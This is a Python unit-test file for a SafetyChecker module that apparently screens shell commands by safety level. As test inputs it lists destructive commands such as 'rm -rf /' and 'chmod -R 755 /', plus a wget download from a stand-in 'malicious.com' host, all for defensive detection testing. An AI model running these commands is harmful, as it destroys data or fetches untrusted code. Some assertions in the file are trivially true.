"""
Extended unit tests for Safety Checker module to improve coverage
"""

import unittest
from nlcli.safety_checker import SafetyChecker


class TestSafetyCheckerExtended(unittest.TestCase):
    """Extended test cases for SafetyChecker class to improve coverage"""
    
    def setUp(self):
        """Set up test fixtures"""
        self.safety_checker_low = SafetyChecker(safety_level='low')
        self.safety_checker_medium = SafetyChecker(safety_level='medium')
        self.safety_checker_high = SafetyChecker(safety_level='high')
    
    def test_safety_levels_comparison(self):
        """Test different safety levels with same command"""
        cmd = 'sudo systemctl restart nginx'
        
        low_result = self.safety_checker_low.check_command(cmd)
        medium_result = self.safety_checker_medium.check_command(cmd)
        high_result = self.safety_checker_high.check_command(cmd)
        
        # High safety should be most restrictive
        self.assertIn('safe', low_result)
        self.assertIn('safe', medium_result)
        self.assertIn('safe', high_result)
    
    def test_warning_patterns_loading(self):
        """Test that warning patterns are properly loaded"""
        # Check that patterns are loaded
        self.assertIsInstance(self.safety_checker_medium.warning_patterns, list)
        self.assertGreater(len(self.safety_checker_medium.warning_patterns), 0)
        
        # High safety should have more patterns than medium
        self.assertGreaterEqual(
            len(self.safety_checker_high.warning_patterns),
            len(self.safety_checker_medium.warning_patterns)
        )
    
    def test_get_danger_reason(self):
        """Test danger reason explanations"""
        dangerous_cmd = 'rm -rf /'
        result = self.safety_checker_medium.check_command(dangerous_cmd)
        
        if not result['safe']:
            self.assertIsNotNone(result['reason'])
            self.assertGreater(len(result['reason']), 0)
            self.assertIn('delete', result['reason'].lower())
    
    def test_additional_risk_checks(self):
        """Test additional risk factor detection"""
        risky_commands = [
            'rm -rf *',  # Wildcard deletion
            'chmod -R 755 /',  # Recursive operation
            'cp -f source dest',  # Force flag
            'wget http://malicious.com/script.sh',  # Network operation
        ]
        
        for cmd in risky_commands:
            result = self.safety_checker_medium.check_command(cmd)
            # Should either be unsafe or have warnings
            if result['safe']:
                self.assertGreaterEqual(len(result['warnings']), 0)
    
    def test_safer_alternatives_suggestions(self):
        """Test that safer alternatives are suggested for dangerous commands"""
        dangerous_cmd = 'rm -rf /'
        result = self.safety_checker_medium.check_command(dangerous_cmd)
        
        if not result['safe']:
            self.assertIn('suggestions', result)
            # Should provide alternatives (if implemented)
    
    def test_platform_specific_detection(self):
        """Test platform-specific dangerous pattern detection"""
        # Test that platform is detected
        self.assertIsNotNone(self.safety_checker_medium.platform)
        self.assertIsInstance(self.safety_checker_medium.platform, str)
        
        # Should have platform-specific patterns
        self.assertIsInstance(self.safety_checker_medium.platform_dangerous, list)
    
    def test_edge_case_commands(self):
        """Test edge cases and unusual commands"""
        edge_cases = [
            '',  # Empty command
            '   ',  # Whitespace only
            'echo ""',  # Empty echo
            'ls; echo "done"',  # Command with semicolon
            'ls && echo "success"',  # Command with &&
            'ls || echo "failed"',  # Command with ||
            'cat < file.txt',  # Input redirection
            'echo "test" | tee file.txt',  # Pipe with tee
        ]
        
        for cmd in edge_cases:
            result = self.safety_checker_medium.check_command(cmd)
            # Should handle without crashing
            self.assertIn('safe', result)
            self.assertIn('warnings', result)
            self.assertIn('reason', result)
            self.assertIn('suggestions', result)
    
    def test_initialization_with_invalid_safety_level(self):
        """Test initialization with invalid safety level"""
        # Should handle invalid safety levels gracefully
        invalid_checker = SafetyChecker(safety_level='invalid')
        self.assertIsNotNone(invalid_checker.safety_level)
        
        # Should still work
        result = invalid_checker.check_command('ls -la')
        self.assertIn('safe', result)


if __name__ == '__main__':
    unittest.main()